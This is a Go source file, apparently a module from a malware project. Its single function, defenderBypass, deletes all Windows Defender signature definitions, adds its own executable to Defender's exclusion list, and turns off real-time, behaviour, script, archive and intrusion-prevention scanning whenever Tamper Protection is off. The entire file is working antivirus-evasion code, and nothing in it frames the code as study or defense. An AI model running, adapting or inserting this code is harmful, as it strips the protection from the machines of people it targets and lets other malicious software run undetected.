package main

import (
	"os"
	"strings"
)

// defenderBypass attempts to bypass Windows Defender or other antivirus software by whitelisting the executable
func defenderBypass() {
	exePath, err := os.Executable()
	if err != nil {
		panic(err)
	}

	// Remove all definitions
	executeCommand(os.Getenv("ProgramFiles")+"\\Windows Defender\\MpCmdRun.exe", "-RemoveDefinitions", "-All").Run()

	// Add the executable to Windows Defender exclusions
	executeCommand("powershell", "-Command", `Add-MpPreference -ExclusionPath "`+exePath+`"`).Run()

	// Check if Tamper Protection is enabled
	isTamperProtectionEnabled, err := executeCommand("powershell", "-Command", "(Get-MpComputerStatus).IsTamperProtected").Output()
	if strings.TrimSpace(string(isTamperProtectionEnabled)) == "False" {
		// Disable real-time monitoring and other protections
		executeCommand("powershell", "-Command", "Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true -DisableScriptScanning $true -DisableArchiveScanning $true").Run()
	}
}
